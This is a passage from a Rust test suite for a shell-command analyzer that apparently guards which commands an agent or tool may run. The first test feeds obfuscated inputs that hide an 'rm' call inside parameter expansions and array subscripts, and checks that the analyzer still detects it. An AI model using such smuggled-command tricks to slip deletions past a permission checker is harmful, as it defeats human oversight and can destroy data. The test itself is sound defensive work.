            "echo \"${x-\"'$\\(rm  F)'\"}\"",
            "x='a[$(rm F)]'; a=(1); echo ${=a[(e)x]}",
        ] {
            let Ok(a) = analyze(src, Path::new("/workspace")) else {
                continue;
            };
            if a.dynamic.is_some() {
                continue;
            }
            let all: Vec<&String> = a
                .commands
                .iter()
                .chain(&a.delegated)
                .chain(&a.deny_only)
                .map(|(r, _)| r)
                .collect();
            assert!(
                all.iter()
                    .any(|r| crate::wildcard::matches(r, "rm *", false)),
                "{src:?}: {all:?}"
            );
        }
    }

    /// The differential fixes leave ordinary commands checkable.
    #[test]
    fn sec_differential_fixes_keep_common_commands() {
        for src in [
            "git commit -m \"$(cat <<'EOF'\nFix the parser (and tests)\n\nIt's done; don't worry.\nEOF\n)\"",
            "cat <<EOF > run.sh\ncargo build \\\n  --release\nEOF",
            "bash ./build.sh",
            "sh scripts/x.sh arg",
            "source ./env.sh",
            "xargs rm < list",
            "find . -name '*.o' -exec rm {} +",
            "find . -type f -exec grep -l x {} \\;",
            "echo $'\\x41\\101'",
            "a=(one two); echo \"${a[@]}\"",
            "/usr/bin/git status",
            "env FOO=1 cargo test",
            "time cargo build",
            "echo $(date) $(uname -s)",
        ] {
            let a = analyze(src, Path::new("/workspace")).unwrap_or_else(|e| panic!("{src:?}: {e}"));
            assert!(a.dynamic.is_none(), "{src:?}: {:?}", a.dynamic);
        }
        for src in ["xargs -I", "xargs -n", "env -u", "(( ))", "$'\\c'"] {
            let _ = analyze(src, Path::new("/workspace"));
        }
        let a = full("/usr/bin/git status");
        assert!(
            a.delegated.iter().any(|(r, _)| r == "git status"),
            "{:?}",
            a.delegated
        );
        assert_eq!(full("echo $'\\x72m'").delegated[0].0, "echo rm");
        assert_eq!(
            full("echo x > ~+//out").writes[0].path.as_deref(),
            Some("/workspace/out")
        );
        // Zsh drops empty quotes before expanding `~`.
        assert_eq!(
            full("echo x > \"\"~/f").writes[0].path,
            Some(home().join("f").display().to_string())
        );
        assert_eq!(full("'cd' /tmp; echo x > f").directories, ["/tmp"]);
        let paths: Vec<Option<String>> = full("echo x > \"\"~")
            .writes
            .into_iter()
            .map(|w| w.path)
            .collect();
        assert_eq!(
            paths,
            [Some(home().display().to_string()), Some("~".into())]
        );
    }
}
